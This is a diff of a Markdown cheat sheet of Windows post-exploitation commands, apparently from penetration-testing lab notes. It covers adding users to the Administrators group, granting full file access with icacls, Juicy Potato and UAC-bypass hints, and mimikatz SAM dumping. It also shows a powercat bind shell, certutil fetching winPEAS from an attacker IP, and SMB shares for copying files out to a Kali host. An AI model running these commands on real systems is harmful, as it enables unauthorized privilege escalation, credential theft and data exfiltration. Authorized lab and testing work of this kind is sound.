@@ -13,6 +13,7 @@ net localgroup "Remote Desktop Users" [username] /add
 net localgroup "Administrators" [username] /add
 -----------------------------------------------------------
 icacls "C:\Puppet"    # check path permission
+icacls [FILE] /grant [USERNAME]:F   # :F for full access
 whoami /priv    # Look for SeImpersonatePrivilege > Juicy Potato
 whoami /groups		# UAC bypass
 ```
@@ -90,13 +91,6 @@ load kiwi   # mimikatz
 lsa_dump_sam
 ```
 
-### iCACLS.exe
-```
-Change file and folder permission 
-icacls [FILE] /grant [USERNAME]:F   # :F for full access
-```
-Ref: https://ss64.com/nt/icacls.html
-
 ### RPC
 ```
 rpcdump.py [USERNAME]@[IP_ADDR]
@@ -138,17 +132,17 @@ powercat -l -p 443 -e cmd.exe   # bind shell
 ```
 certutil.exe -f -urlcache -split http://192.168.49.157/winPEASany.exe
 
+--------Windows to Linux----------
+Method 1:
 SMB method: 
-On kali:
-impacket-smbserver [SHARE NAME] $(pwd) -smb2support -user [USER ON KALI] -password [PASSWORD ON KALI]
+On kali: impacket-smbserver [SHARE NAME] $(pwd) -smb2support -user [USER ON KALI] -password [PASSWORD ON KALI]
 On windows:
 $pass = convertto-securestring '[PASSWORD ON KALI]' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('[USER ON KALI]', $pass)
 New-PSDrive -NAME [USER] -PSProvider FileSystem -Credential $cred -Root \\[KALI IP]\[SHARE NAME]
 
---------Windows to Linux----------
-Via SMB:
-on Linux : smbserver.py test ./share
+Method 2:
+on Kali : smbserver.py test ./share
 smbserver.py [share_name] [folder_path]
 
 on Windows: copy proof.txt \\192.168.119.160\test\proof.txt
